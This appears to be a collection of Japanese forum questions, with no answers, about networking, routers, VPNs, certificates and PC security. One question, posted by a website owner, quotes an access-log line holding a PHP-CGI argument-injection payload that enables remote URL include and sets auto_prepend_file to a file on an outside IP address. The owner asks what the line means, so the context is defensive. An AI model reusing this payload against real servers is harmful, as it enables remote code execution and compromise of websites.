グローバルインターネット --- ルータ(192.168.0.1) --- PC(192.168.0.11) という構成だと思います。 プロバイダはJCN関東です。 これは普通の接続状況なのでしょうか？ 経路を換えることによって通信を傍受するという可能性はあるのでしょうか? てっきり一行目は192.168.0.1になるかと思っていたのですが... どなたかわかる方がいましたら、ご教授お願いします。
TCPのウィンドウ/フロー制御とethernetのフレームの分割についてご質問です。 書籍を読んでいると TCPはウィンドウ/フロー制御で、一度に送るセグメントサイズを調整しているとあります。 しかしEthernetもフレーム分割を行うとあります。 そうなると、どちらのプロコトルが主体的にデータを分割するのか本を読んでもいまいちわかりません。 例えば、TCPがウィンドウサイズを4500byteにして一度にデータを送信すると データリンク層のEthernetで、4500byteを1500byteずつに三分割するんでしょうか？ だとすると、4500byteのデータを送った場合、TCP上では1つのセグメントを送信したことになり Ethernet上だと3つのフレームを送信したことになります。 それとも、TCPが4500byteのデータを送る場合 TCPがデータリンク層で一度に送信できるフレーム長を判断して TCP上で4500byteを一度に送信せずに、1500byteに分割してEthernetに送り Ethernetはその1500byteのデータを三回送信することになるんでしょうか？ わかりにくい質問で申し訳ありません。
８５枚のDVDがあります。合計３００Ｇ。 これをHDDに入れて他人さんに貸す場合、動画は視聴できるが編集されないようにする方法ってありますかね？ 他人さんは編集できるソフトがあります。ホームビデオカメラを購入した時に付いていたらしいです。 精通されている方、居られましたら宜しく願います。
自宅PCから社内のPCへリモートデスクトップ接続を行おうとしていますが、うまくいきません。 （会社の許可はもらっております。） エラー内容は 　「リモートデスクトップはリモートコンピューターに接続できません」 社内にはA、Bの2台PCがあります。 うまく接続できないのは、自宅PCからBに対してです。 [自宅側] 自宅PC（Windows7 32bit workgroup) [社内LAN　グローバルIPは固定]　 ※ルーターにて（ポート3389→192.168.0.101） A（Windows7 32bit workgroup IP:192.168.0.100) B(Windows7 64bit domain IP:192.168.0.101） 以下の二通りについては、問題なくリモートデスクトップで接続できました。 ・自宅PC→A（この時はルーターの設定を192.168.0.100に変更) ・A→B 自宅PC→Aでつながっているので、ADユーザーの権限辺りが怪しいのかなと考えて、権限を いじってみましたが、結果ダメでした。 現在Bのログインユーザーは、 ・Administrators ・Domain　Admins ・Domain　Users ・Remote Desktop　Users が所属グループになっています。 どなたか、造詣が深い方いらっしゃったらご教授お願いします。
2重構成のルータからのVPN接続について質問させて頂きます。 (1)インターネット接続済みの拠点をインターネットVPNで接続したい。 (2)VPNルータで各拠点のルータを置き換えれば済むと考えていたところ、 　実は各拠点のルータで光電話等‥のVPNルータ側にない機能が使われており 　単純に置換すると今まで利用できた機能が使えなくなるので置き換えできない。 上記の理由から、現状のルータを活かしたまま、VPNルータを2重構成にする方向で考えています。 （2重構成で無くても構わない場合はその方法も知りたいですが、既にVPNルータ購入済みの状態 　から作業を引き継いだので、VPNルータは活かしたいです。） 実現したい構成を纏めると下記のようになります。 拠点A　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　拠点B ------------------------------------------------------------------- PC　-> VPNルータ -> ルータ ->（インターネット）<- ルータ <- VPNルータ<- PC 　　　　　　　　　　　　　　　↑　　　　　　　　　　　　　　　　↑ 　　　　　　　　　　　　　　その他PC　　　　　　　　　　　その他PC　 VPN接続が必要な端末は限られているので、その他のPCは今まで通り、 通常のルータに接続したままを考えています。（要はVPNルータとVPN接続用PCのみ追加予定です。） 拠点Aに関してはその他PCとVPN接続下のPCでファイルの共有等はやる予定です。 新規のVPNルータはYAMAHAのRTX1200、既存ルータがNECのWEBCASTER　V110です。 拠点BのルータはYAMAHA製です。（機種番号は失念しました） こちらのサイトを参考に設定したのですが、うまくいきませんでした。 http://news.mynavi.jp/series/vpn/010/ 拠点B側も2重構成という部分が異なる為だと考えていますが、 設定方法等分かる方がいらっしゃればお知恵を拝借できれば　と思います。 長々とすみませんが、宜しくお願い申し上げます。
お世話になっています。 現在、ＮＴＴの光回線でマルチセッションを利用しています。 下記のような構成で利用しており、最近セグメントBから外部へアクセスできるようになりました。 ONU === ルータA(ブリッジとして使用) === ルータB（RTX1200） === セグメントA(192.168.1.X) 　　　　　　　|| 　　　　　　　=== ルータC（IX2215） === セグメントB(192.168.15.X) ルータA = 192.168.1.2 ルータB = 192.168.1.1（内側） 　　　　　　　プロバイダＡのグローバルIP（外側） ルータC = 192.168.15.1（内側） 　　　　　　　プロバイダＢのグローバルIP（外側） セグメントBからセグメントAへの通信を試みているのですがpingすら届かない状況です。 こういった構成の場合、別セグメントへの通信するにはどういった設定が必要になりますでしょうか。 見当違いな質問かもしれませんが、よろしくお願い致します。
スーパーセキュリティー　ゼロをつかっております。 インターネット検索時に 画面上のほうに 黒色の点々のついたツールバーがでています。 中身は　「このサイトは安全です」 とかかれており、 開くサイトによっては、画面中央付近にツールバーが 降りてくるため　非常に邪魔になっています。 このバーの削除の方法はないのでしょうか？
ネットワークアドレス/ブロードキャストアドレスにの求め方についての質問です。 110.222.34.90/27 このIPアドレスからブロードキャストアドレス、ネットワークアドレスの求め方 について解説付で答えていただきたいのですが？ それと設定可能なIPアドレス数も解説付きでお願いします。 ちなみに私がやってみた答えです。 ネットワークアドレス　　110.222.34.90.192 ブロードキャストアドレス　　110.222.34.90.63
なぜインターネットの暗号は素数の掛け算を主に使うのでしょう？
HTTPSサーバーにアクセスした場合、第三者証明機関は中間証明書とサーバー証明書が 渡すという話をしており、ほかの者に確認したら、中間証明書とサーバー証明書は クライアントに渡すことはなく、渡していたら、オレオレ詐欺みたいに偽ることが できてしまうので、CA証明書と中間証明書はOSに入っているという話をしています。 どちらが本当のことを言っているのか確認しようと思い、以下のことを行いました。 WindowsVistaを新規インストールした状態で確認したところ、IEの「信頼されたルート証明機関」 及び「中間証明機関」にベリサインなどのいくつかの証明書が入っていました。 その状態でセコムのサイトにアクセスしたら、セコムのCA証明書が「信頼されたルート証明機関」 に入っており、パス検証は問題ありませんでした。 WindowsVistaを新規インストールした状態では、セコムのCA証明書、中間証明書は入って いませんでしたので、セコムのCA証明書がセコムのサイトにアクセスした際にインストールされたのは 間違いありません。セコムの中間証明書はIEの「中間証明機関」に入っていませんでした。 この時点でCA証明書はOSに入っているという話をされている者が間違っていることが確認できました。 CA証明書にも無論　有効期限があるので、ルート証明書の更新で更新されるので初めから入っているCA証明書がずっと使われるわけではありません。 ＜確認を行いたい点＞ 1.セコムのサイトにアクセスしたら、セコムのCA証明書が「信頼されたルート証明機関」に入ったので これがどこからインストールされたか確認する方法はありますでしょうか。 パケットキャプチャを取得することになると思いますが、どの点に着眼すれば、それが確認できますでしょうか。 2.IEにはセコムの中間証明書は入っていないにもかかわらず、セコムのサイトにアクセスしたらパス検証は問題ありませんでした。パス検証に問題がないということは中間証明書及びサーバー証明書がHTTPSサーバー側から提示されているか、渡されているになると思いますが、どのような方法を行えば確認することができますでしょうか。 パケットキャプチャを取得することになると思いますが、どの点に着眼すれば、それが確認できますでしょうか。
ファイルサーバー（イントラネット）の特定ファイル、フォルダへの アクセスを確認する方法はありますか。 特別ID、Pass等設けていない、社内の共有ファイルサーバーです。 よろしくお願いします。
WindowsXP以降ルート証明書の更新機能が追加され、WindowsUpdate(Microsoft Update)でルート証明書が更新されるようになっていますが、更新されるのはルート証明書のみで中間証明書は更新されないという認識であっているかご存知の方がいらっしゃいましたらご教示を頂けますようお願い致します。
スイッチ同士のループが発生した場合 STPによって迅速にループは解決されると思います。 しかし、スイッチとハブのループの場合はどうなるのでしょうか？ 例えば、オフィスのワンフロアを一台のスイッチが担当していたとして ネットワークの知識が乏しい人がハブを勝手に持ち込んで 何かの拍子にループ構成になってしまうことはありえると思います。 そうなるとブロードキャストストリームが発生して そのフロアだけではなく、影響は広範囲に及んでしまうのではないでしょうか？ その場合の解決策は何かあるのでしょうか？ 私が思いついたのはVLANを使用して、 出来るだけブロードキャストドメインを小さくする事くらいです 実際の現場ではどのようにこのループを回避しているのでしょう？
パソコンからネットワークへのアクセス制限を行いたいのですが、以下のような状況で可能なのでしょうか。 可能であれば設定方法をお知らせいただけますでしょうか。 OSはWindows 7 Professional。WORKGROUP使用です。 私どもの部署のパソコンを、セグメントの異なる他部署の人間に使用させます。 使用させるアカウントは管理者権限を与えています。 他部署の人間は私どものパソコンで、自分たちの部署のパソコンへリモートデスクトップ接続し、自分たちの部署のパソコンの中でファイル開き、閲覧します。 従いまして、私どものパソコンのOffice等のアプリケーションを開くということはないですし、設定を大きく変えるということもありません。 しかしながら、私どものセグメントには他部署に見せたくないNAS等があります。すべて固定IPです。 一部、アクセス制限を設定していないNASもあり、それは私どものパソコンを使用する限りは（現状の設定では）見えてしまいます。 また、プリンタも同様です。 このように、他部署のセグメントへ接続させつつ、私どものネットワーク資産にアクセスさせない、という設定は可能なのでしょうか。 新たに制限ユーザーを作成することも、グループポリシーなどを変更することも可能です。
昔の黒い電話機（NTT）へ、携帯（AU)から電話したときに 携帯からAUの基地局までの間は暗号化されると思っています。 １．基地局から先のAUの終わりまでの部分 ２．AUの終わりの局からNTTの最初の局までの部分 ３．NTTの局から黒電話までの部分 と考えたときに、 暗号化が解除されるのはどこからでしょうか？ 古い電話機に暗号化さたデータを復号化する能力はないし、 そもそも、アナログのデータしか扱えない黒電話ですから。 携帯電話の暗号化について調べてみたら、 携帯端末から基地局までの部分については暗号化の説明があったのですが、 最初の基地局から先の説明がなかったので気になりました。 逆に、黒電話から携帯へ電話をかける場合はどうなりますか？ なにか、参考になる資料などがありましたら教えてください。 よろしくお願いいたします。
ショッピングサイトや会員制のサイトでログインする際に、 ＩＤとパスワード(以下PW)を入力しますが、このＩＤとPWは ネットワーク管理者は調べようと思い調べればわかってしまうものでしょうか。 例えば、今こうやってＯＫＷＡＶＥで質問しており、その回答を 明日会社のＰＣで見ようと思った場合、ログインするために ＩＤをＰＷを入力しなくてはいけません。 それ以外のサイトであっても、ちょっと休憩中にネットショッピングをするとか、 仕事に必要な資料をダウンロードするために、会員制のサイトにログインする際 ＩＤ　ＰＷが必要になると思います。 おそらく、ネットワーク管理者は見ようと思えば、サーバを調べればわかると思います。 見られて困ることはないのですが、しかし、ＰＷを知られてしまうというのは怖いです。 特にネットバンキングなんて。 後、こうやって投稿している文章の内容までもわかってしまうのでしょうか。 これもおそらくわかるのではないかと思っております。 ちなみに、当社は休憩中は会社のＰＣであってもインターネット閲覧は可ですので、 その辺を取り上げる回答はご遠慮願います。 宜しくお願いします。
こちらのグローバルIPアドレスとローカルIPアドレスを相手は 分かっていて、ウィルスが感染していない事が前提で PCがハッキングされる事はあるのでしょうか？ ちなみにMacBookProにWindows7をインストールして使っています。 リモートデスクトップはOFFにしています。 MacBook標準搭載のPCマイクの入力はONにしていました。 インターネットはルーターから有線でつないでいます。 この状態からPCにアクセスされMacBookのWebカメラの起動ランプ を消したまま(こちらが分からない様に)での盗撮、 PCマイクにアクセスして 盗聴されるのは可能でしょうか？
会社内のシステム担当の者です。 ある人の端末から社内ネットワーク上のNAS（NAS1)にあるA というフォルダが閲覧できません。 ReadOnlyというグループを作っており、フォルダのセキュリティでReadOnlyを追加しています。 このグループにドメインに参加しているユーザーを追加すれば、閲覧できるはずですが、 閲覧できない人が１人だけいます。 他の人は閲覧できます。 上記方法で閲覧できないため、さらにドメインに参加しているユーザーを フォルダのセキュリティに直接追加してみましたが、 それでも閲覧できません。 NAS1にpingは飛び、 \\NAS1　には入ることができますが、 \\NAS1\A に入ることができません。 説明が下手で申し訳ありませんが、 解決策をご教授いただければ幸いです。
S/MIMEの証明書を作るソフトについて調べています。 http://eternalwindows.jp/crypto/certverify/certv … の記述で、以下のものがありました。 さて、それではユーザーは、どのようにしてCRLを取得することになるのでしょうか。 これは証明書の検証時などに、アプリケーション内で暗黙的に ネットワーク上からダウンロードすることになっているため、 ユーザーが手動でCRL配布ポイントにアクセスするようなことはありません。 ただし、ダウンロードしたCRLはローカルコンピュータ上にキャッシュすることも可能であり、 キャッシュされたCRLのみで証明書を検証する方法もよく用いられます。 また、CRLは証明書と同じくシステムストアに格納することも可能です。 となっていますが、CRLのデータサイズはどのくらいなのでしょうか？ 大きすぎて扱いに困るようなことはありませんか？ よろしくお願いいたします。
OSはWindows７pro SP1です。 自席PC　　　　＝１９２．１６８．０．１０ ルーター（GW)＝１９２．１６８．０．１ （自席PC）－（HUB）－（ルーター）－（ネット）という接続という条件とします。 ping 192.168.0.1　の場合は当然損失０％で返ってきます。 ping 192.168.0.200　という第３セグメントまでは一緒だが、第4が明後日に向けてPINGを行った場合、 「192.168.0.10 からの応答: 宛先ホストに到達できません。」 と返ってきます。当然、192.168.0.200には何の機器もありませんしルーティングテーブルにもありません。 繋がらない先なら「要求がタイムアウトしました」と表示されていいと思うのですが、何がどう違うのでしょうか？ 最終的な目的は、コマンドプロンプトでERRORLEVELから処理分けを行いたいのです。 PINGが飛ばないなら、次のIP（プローブ）にPINGを進める、ログ記録に「NG」とだけ記録したいと言う場合に使いたいのです。 しかし「宛先ホストに到達できません」はエラーレベル分岐が使えず困っています。 どなたかご助言頂けないでしょうか。宜しくお願い致します。
プロキシ非対応で、HTTPでインターネット上のサーバと通信するソフトがあります。 そのソフトを会社内から使いたいのですが、会社にはプロキシサーバが立っている ため、プロキシサーバを経由してID/PASSを入力した上で、インターネットに出る 必要があります。 プロキシ非対応のソフトを変更する（作者に改良してもらう）以外に、何か良い 方法はありませんか？ アウトバウンドのTCP:80をフックして別のホストに向けるようなラッパーがあって、 proxyサーバに対応しているソフトでもあれば、なんとかなるような気がするのですが・・・
ＳＯＮＹブルーレイレコーダーＢＤＺ－ＡＴ７７０ＴとＤＯＣＯＭＯアンドロイドタブレット、ＳＣ－０１Ｄをホームネットワーでついないでいます。アンドロイドバージョンは4.0.4です。 番組管理アプリのレコプラで放送中番組の視聴ができるはずなのですが、Twonky Beamで視聴しよとしても 「暗号化されていないWIFI接続のため、保護コンテンツをアクセスできません」 と表示されて、見ることができません。 また、Twonky Beamの方ではなく、「レコーダーのチャンネルを切り替えて視聴」という方を選択しても 特に画面上に反応がなく、これも見ることができません。 どのようにすればよろしいのでしょうか。
システム・ソリューション提供を仕事としている者です。 とあるお客様環境にWebDAVを用いたファイルサーバを構築しクライアントPCにマウントし動作試験（各種ファイル操作）を行ったところ、次のようなエラーイベントがたびたび発生するようになりました。 （エラー発生アドレスは毎回同一です） エラー発生アプリケーション　　BKTask.exe、バージョン 3.1.17.6 エラー発生モジュール　　wininet.dll、バージョン 6.0.2900.5512、エラー発生アドレス 0x00003674 環境は以下のとおりです。 サーバシステム： ファイルサーバ（WebDAV/Apache2.2）システム クライアント： WindowsXP SP3標準のネットワークドライブ（WebClientサービス）を利用 切り分けのため、以下の関連情報をお持ちの方は情報提供いただけると助かります。 よろしくお願いいたします。 １）BKTask.exeが予期せず停止したご経験のある方 どのような時に停止しましたか？ その際の解決策はどのような方法でしたでしょうか？ ２）wininet.dllの利用においてエラーの発生や障害をご経験された方 どのようなエラーや障害でしたでしょうか？ その際の解決策はどのような方法でしたでしょうか？ ちょっとした事でも結構ですので、よろしくお願いいたします。
プロバイダで契約しているのですが、困っています。 amazonで購入したダウンロード版のソフトウェアをダウンロードし、それを開こうとすると”ゲートウェイ通信に問題があります”と出てしまい、そのソフトウェアを使用することができないでいます。 それをamazonに問い合わせたところ、「”ゲートウェイ通信に問題・・・”というエラーメッセージは、お客様のネットワーク接続環境に起因する可能性がありますため、一度ご契約のプロバイダへお問合せください」とのことでした。 他にいろいろと試してみたのですが、やはり開けないままです。ネットワーク接続環境に問題があるのでしょうか？もしあるのであればどうすれば良いのでしょうか。 せっかく購入したのですが使えないままで困っております。返答お願い致します。
LAN内にプロキシサーバ(プロキシA)を立てて、外に出るアクセスのログを取っています。 このときローカルPCのブラウザでLAN外にあるプロキシサーバ(プロキシB)をプロキシに設定して サイトCへアクセスしたとき、プロキシAのログにはプロキシBへのアクセスログだけが残り、 サイトCへアクセスしたというログは残らないという認識であっていますでしょうか。
私が運営するWebサイト（www.example.comとします）に、以下のようなアクセスログが残っていました。 www.example.com/?-dsafe_mode=Off -ddisable_functions=NULL -dallow_url_fopen=On -dallow_url_include=On -dauto_prepend_file=http://61.19.253.26/echo.txt 最後のIPアドレス「61.19.253.26」を調べると、タイ国のもののようですが、使用されていないようです。 これってサイバー攻撃の一種なのでしょうか？ 何かしらの情報が盗まれたりした痕跡なのでしょうか？ 自分で、ブラウザに上記URLを打ち込んだのですが、反応がありませんでした。 ちなみに、私のサイトはレンタルの共有サーバーで運用しています。 また、全てPHPで作成しており、ルートのindex.phpにパラメータを与えることで、全てのページを表示させるようにしています。 なお、index.phpとcssや画像以外は非公開ディレクトリに置いています。 また、同一契約で上記と同じ公開ディレクトリに複数のWebサイトを作っています。 盗まれたものは取り返せないので仕方がないのですが、危険な攻撃であればセキュリティを高める手段を講じる必要があると感じています。 上記アクセスで何が行われたのか、どのような危険があるのか、ご存じの方がいらっしゃいましたらご教授いただければ幸いです。 よろしくお願いいたします。
ipodtouchを購入しようと考えているのですが、 無線LANは、買いに行ったお店で契約とかをしないといけないのでしょうか。 自分の家の回線とかがフレッツ光とかでも普通に関係なく買えるのでしょうか。 あと、ipodtouchより先に無線LAN購入していいのですよね？？ 本当に何も分からなくてすみません。 意味が分からない人もいるかもですが、回答お待ちしています！。
ブラジル政府は14日、 政府の通信を米国などの盗聴から守るため、機密性を高めた電子メールシステムにする。 ということですが、どんな工夫をすれば、機密性が高まるのでしょうか？ たとえば、 １、S/MIMEやSSLで使うAES暗号のブロック長を長いものにするとか、でも互換性がなくなるかも？ ２、SSLでの公開鍵の長さを４０００ビット程度のものにするとか、、、、互換性が？ ３、アメリカとは通信しないとか、、？ ４、送信前に、データを独自に暗号化処理するとか、、？ どんな工夫があるのか、なかなか思いつきません。 面白い工夫があればお聞かせください。　よろしくお願いします。
リンクアグリゲーション機能つきとなしの機器を つなげた場合、どういう症状が発生するのでしょうか？ （ループが発生してしまうなど） ハブ１：リンクアグリゲーション機能つき ハブ２：リンクアグリゲーション機能なし 接続図 ルータ－ハブ１＝ハブ２－PC
２ちゃんねるの中で、有名な企業のスレッドがいくつも立てられていますが、その中には社内の人間が書いているなあと思われるモノがたくさんあります。時々新聞発表前の情報もあるみたいで（例えば、○○工場閉鎖、○月○日にリストラ発表　など）、もし企業側が本気になれば、ＩＰアドレスから個人の特定まで行い損害賠償などの訴訟を起こすことは可能でしょうか。過去にそこまで企業側が対応した例があれば教えて下さい。会社を愛する人間としては、本当に腹が立っているので、何か対応できないかと思っているのですが・・・
カテゴリが違っていたらすみません。 ストームコントロール機能についての質問です。 仮にPPSで閾値を設ける際、上限閾値に達すると以降のパケットを破棄し、下限閾値を下回ると パケットの受信が再開されるとの記述を目にしました。 オプションでshutdown等もできるようですが・・・ もしSWの接続がループになっておりshutdown等も実施しないとすると、パケット数が上限を超えなくはなるが、ループでブロードキャストが発生し続けるため、下限値を下回ることはなく、回線の帯域を確保する一時しのぎ的な機能というイメージでよいのでしょうか。 また、根本的に解決するにはケーブルを抜くかshutdown等が必要になるということでよいでしょうか？ よろしければ回答願いいたします。
モデムに直接繋げると、回線が繋がるのですが、 スイッチング式のハブを介すると、回線速度が恐ろしく落ちるのです。 普通のヤフートップですら、つなげることができず、非常に困っています。 現在、ハブ回線は、 モデム――スイッチング式ハブ（100BASE）――ノートパソコン★ 　　　　　　　　　　　　　　　　　　 　　　　　　 ――無線LAN―――ノートパソコン となっており、★の部分のパソコンが回線が非常に遅くなります(反応はあります)。 無線LANでのハブ機能でも、全く使えませんでした。 もう一方のノートパソコンのほうは問題なく使えるだけに、非常に歯がゆい状態です。 何とかなりませんですか。
教科書で勉強しているとどうしてもわからない点があったので ご質問させていただきたく思います。 ■質問1、サブドメインへのアクセスについて 例えばレンタルサーバーで以下のように無数のサブドメインがあるとします。 USER_A.rental_space.com USER_B.rental_space.com USER_C.rental_space.com etc........ このサブドメインについて、それぞれ1台ずつのサーバーが割り当てられていたら問題はないと思います。 しかし、実際は複数のユーザーで一つのサーバーをシェアしていると思います。 そうすると上記の三つのサブドメインがすべて同じサーバー(IP)へ接続する可能性もあります。 その場合、どうやってサーバーはそれぞれのドメインを判断しているのでしょうか？ 私の想像では、HTTPヘッダーのドメイン名で見分けていると思うのですが そうするとサブドメインはHTTPやHTTPSのようなヘッダーにドメインが記述されていないプロコトルでは使用出来ないということになります。 また、HTTPヘッダーをあえて記述しない場合も、適切なサブドメインへアクセスできないと思います。 以上の点について教えていただけたらと思います。 ■質問2、広域イーサネットとIP-VPNとインターネットVPNについて 広域イーサネットとIP-VPNとインターネットVPNについてなのですが、 以上の三種類のサービスについて、それぞれ物理的な別のネットワークが存在しているんでしょうか？ 特に広域イーサネットとIP-VPNは物理的に別のネットワークなのか？それとも サービスが違うだけで物理層では同じネットワークなのかが知りたいです。
こんばんは。 教えて下さい。お恥ずかしい話ですが、会社のPCから海外アダルトサイトを4日間程悦覧していました。5日目から会社のPCメールに、英文で迷惑メールが日に3通程度届くようになり、5日目から悦覧をやめました。 初めは気にしていなかったのですが、先日社員しか見れない会社の社員専用サイトに、英文での迷惑メールに注意して下さいとの掲示があり、社員全員に迷惑メールが届いている事を知りました。 そこで質問です。 1．私が迷惑メールの原因である可能性は高いのでしょうか。 2．会社は、迷惑メールに対してどのような対策をとるのでしょうか。またその対策にかかる費用、労力はどの程度のものでしょうか。 3．私が原因だったとして、私の海外アダルトサイト悦覧を会社側が逆探知し、調べられるのでしょうか。また、調べる可能性はあるのでしょうか。 現在の環境を追記します。 1．社員1，500人程度、全国規模の会社です。社内にIT部あります。 2．PCは一人1台支給されています。メールは、社内だけではなく、誰からでも受信できます。 3．私の接続環境ですが、現在社外出向先にて、個人契約のWIFIでインターネットに接続しています。 4．迷惑メール受信後、インストールしてあるウイルスソフトでPC内のウイルスチェックをしましたが、ウイルスに感染していませんでした。 5．海外アダルトサイト内で、アドレスを入力して下さい等の質問はなく、またアドレスを入力してはいません。 6．ドメインは、@会社名．co.jpと簡単なものです。 現在上記の事が気になって、心配しています。どなたかご回答を宜しくお願いします。
家のパソコンはwindows7のデスクトップパソコンでノートパソコンではありません。 ノートパソコンにはwi-fiがついているそうでこのパソコンにはついていません。 なので、wi-fiをつなげるために無線ＬＡＮ子機を買いました 名前はio dataの「ハイパワー無線ＬＡＮ子機ＷＩＮ－Ｇ１５０Ｕ」というものを買いました。 ipod touchをつなげたいので設定をしてみましたがipodに電波はでてるものの押してもつながりません。 どうやったらつながるようになりますか？ 買った子機をアップしましたので参考にしてください
ネットに繋ぐだけでクラッキングを受ける昨今ですが、ネットに繋いだ瞬間グローバルIPアドレスではなく、プライベートIPアドレスを割り振られるUQ Wimaxであれば、ただ繋いでいる状態ではクラッキングの対象にはならないと思うのですが、ルータがWimax側にあるような状態でも、やはり繋いだだけの状態でクラッキングの対象にはなり得るでしょうか？よろしくお願いします。
パソコンとタブレットを無線で接続してデータのやり取りをしたいのですが、PCからタブレットへデータを移そうとすると接続が切れ、待機状態になってしまいます。まったく転送できないわけではなく、MP3の音楽なら何故か二秒だけ、写真データなら上部六分の一ほど転送されます。つまり転送が始まって二秒で接続が切れているようです。タブレットからPCへのデータ移動は問題なく、動画でも何でも移動できます。　　　PCをリカバリー、タブレットは初期化を何度もやりましたが、結果は同じ。タブレットは点検に出しましたが、異常なしでした。 お手上げです。　モバイルルータを使っているので、これの設定に問題があるのかもしれませんが、わかりません。ルータの初期化もやってみました。PCのセキュリティソフトも入ってない状態でやっても結果は同じです。 　片側通行だけ可能というのは訳が分かりません。 PCはVAIOのSVS15119FJBをwindows8にバージョンアップして使っています。タブレットはsonyのSGP312JP/B、ルータはEMOBILEのGL04Pです。誰か助けてください。お願いします。
WZR-HP-G450Hから無線でps3やpcを使用しています。ですが遠くて回線が伸びません。そこで有線にしたいと思います。あとiPhoneやpspのWiFi回線も使いたいです。ですからWZR-HP-G450Hの空きポート～有線で新しい無線ルーターへ～有線でps、ps3へ。新しい無線ルーター～無線でiPhone、pspへ。というのは可能ですか？また可能であればWZR-HP-G450Hを親にして有線で子機としてつかえる無線ルーター。そのルーターはpc、ps3へ有線、iPhone、pspへ無線への同時接続が可能なルーターを探しています。
例えば、　http://www.mse.co.jp/ip_domain/domain_text.html　のページでは、 ＞２：ホスト名（サーバー名）についてもう少し説明します ＞「ａｂｃ．ｍｓｅ．ｃｏ．ｊｐ」という名前のサーバーがあるとします。 のうち、abcがホスト名でmse.co.jpがドメイン名と書いてあるのに、 ＞４：DNS ＞しかし、未だ「www.mse.co.jp」ホストのIPアドレスは判りません。 とwww.mse.co.jpはホストと言っています。 後者はドメイン名ではないのですか？それとも広義の意味でホストという言葉を使っているのですか？ 混乱しています。
トレンドマイクロ アンチウイルスソフト 3年版は、かなり高額ですが、同等品で、安価なソフトをご存じの方がおいでになりましたら、教えてください。 （当方のPCは、VAIOです。トレンドマイクロ社のネットでは、「ウイルスバスター クラウド ＋ 保険&デジタルライフサポート　17,680円」となっています） https://vbshop.trendmicro.co.jp/material/2719000 … よろしくお願いします。
バッファローのLS-XHLシリーズを使っています。 ネットワークドライブの特定のフォルダのアクセス履歴（IPアドレス、できればユーザ名）を取得したいのですが、何か良い方法をご存知でしたら教えて下さい。 製品自体はログ取得機能が無いので、ソフトウェアかアプライアンスを導入する方法になるかと思いますが、コストはかけたく無いです。 ネットワーク上には、２４時間稼働ＰＣが２台ありますので、これを使ってなんとかできないかと思っています。
LINEのパスコードを忘れてしまいました…再発行はできないのでしょうか…？ 改めてアプリをダウンロードしたら、いままでの内容が消えてしまいますよね？？ よろしくお願いします…m(_ _)m
iPhone５について… 先日iOS7.0のアップロードしたのですが、その後からインターネットに接続する時に、『ワイヤレスネットワークを選択』 •auhome-264TRm（カギマーク） •auhome-264TRm-w （カギマーク） （下にキャンセ ル文字） と、選択する表示が出ます。 アップロードする前には表示されなかったのですが、アップロード後は毎回表示されます。 分からないのでキャンセルを選択してますが…これは、どんな意味で、どちらを選択したら良いのでしょうか？(>_<) また表示されないように設定は出来るのでしょうか？ 分かる方教えて下さいm(_ _)m
ネットワークの書籍を読むと 内部PCから外部へアクセスする際、送信元IPとポート番号がルーターのNATテーブルに保持され その変換テーブルを元にして、PATにおけるIPとポートの変換が実現されるとあるのですが いくつか疑問がありましたので質問させてください (1)内部ネットワーク側から通信を開始したなら問題なく通信出来ると思いますが 外部サーバーから始まる通信だとNATテーブルに情報がないためプライベートIPとポートに変換出来ないのではないでしょうか？ その場合は、どういう技術や対象方法があるのでしょうか？ (2)例えば複数の内部PCからPATで外部へアクセスする場合 内部PCのポート番号は65535までのポートをランダムに使用することになると思います。 しかし、もし内部PCが使用するポートが重複してしまった場合はアクセス不能になってしまわないのですか？ つまり、外部サーバーから見ると、10.0.1.1:65535、10:0.1.1:65534のようにポート番号だけ変えてアクセスしてくるわけですし、もしポート番号が重複してしまうと変換出来ないと思います。 ポート番号はそれぞれのPCが独自に設定するものなので重複することもありえると思うのですがどのように処理されているのでしょうか？
同窓会会長 各年代の幹事（学年代表） クラス代表 個人 のように、 同窓会会長の俺俺証明書を信頼して、 上のような連鎖でＳ/ＭＩＭＥ証明書を無料で発行したら、 人間的なつながりで発行するのでＰＧＰに近い証明書になると考えます。 これは、クラス１の無料の証明書よりも信頼できる証明書になるでしょうか？ 作っても、あまり、意味が無いかな？ 認識不足かもしれませんが、 Ｓ/ＭＩＭＥ　での通信は、あまりはやっていないような気がするので、 上のようなことを考えました。 日ごろ、Ｓ/ＭＩＭＥでの通信をしている方のご意見を伺いたいと思います。 よろしくお願いいたします。
I2Pがよくわかりません。ネットで調べてもよくわかりませんでした。 どなたかわかりやすいよう教えてください。
プログラムの空き容量? が少ないとの警告が出ていたので、容量を軽くしようとした所、間違って大事なプログラムを削除してしまったみたいで、 パソコン内の全てのExcelが開けなくなってしまいました。 会社のパソコンなので かなり困っています。 取り戻すことは可能でしょうか？ また、Excelを開くためのプログラムをダウンロード？ をしなければいけないのでしょうか？ 使っているパソコンは Windows XPです。 どうかご回答お願いします。
パソコンをログインすると、突然「動画登録完了しました」とのメッセードと、「まだ入金できていません」というメッセージ現われました。心当たりないので、そのまま無視していたところ、もう一ヶ月以上もその面倒くさい画面が消えません。変なメッセージが現われたころ、たしかにYouTubeは見ましたが、無料動画ばかりでした。そのなかで、たしかにエッチなCM画像もあったのですが、CMは見てしまったと思います。しかし、登録した覚えもなく、どうしたものかと・・・何度か「成人ですか?」の質問には「はい」はクリックしたとは思うのですが・・・・この場合の対処法を教えていただきたいのです。
アメリカの盗聴でブラジルの怒りが、、 http://vagpress-salvador.blogspot.jp/2013/09/blo … ですが、、、、 普通の（アメリカが決めた標準の）暗号方式は解読できるような話も出ています。 いま存在する暗号方式で、それなりに強力な方式は何でしょうか？ ブロック暗号では、ブロックサイズをどのくらい大きくすれば、解読時間を２倍に出来ますか？ 参考文献があれば、教えてください。 （必要な予備知識についても簡単に教えてください。） 読んでみたいと思います。 よろしくお願いいたします。
こんにちは。初歩的な質問で申し訳ございません。 ネットワークセグメントの件で教えてほしいことがあります。 IPアドレスが172.16.0.0　サブネットが255.255.0.0だった場合、 172.16.1.1と172.16.2.1は同一セグメントということになるのでしょうか？ この場合、例えば、PCが172.16.1.1、プリンターが172.16.2.1だった場合 ルーティング設定無しで普通にPC側にプリンターの設定をし、印刷可能になるのでしょうか？ よろしくお願いします。
ロリポップのレンタルサーバーを利用しています。 ドメインを２つ設定しました。仮にAドメイン、Bドメインとします。 Aドメインのサイトを見ている人が、BドメインをリンクURL以外で知る方法はありますか？ 知る方法があるのであれば、教えて下さい。 逆に、知りえないよう対策が可能なのであればそちらも教えて下さい。 宜しくお願い致します。
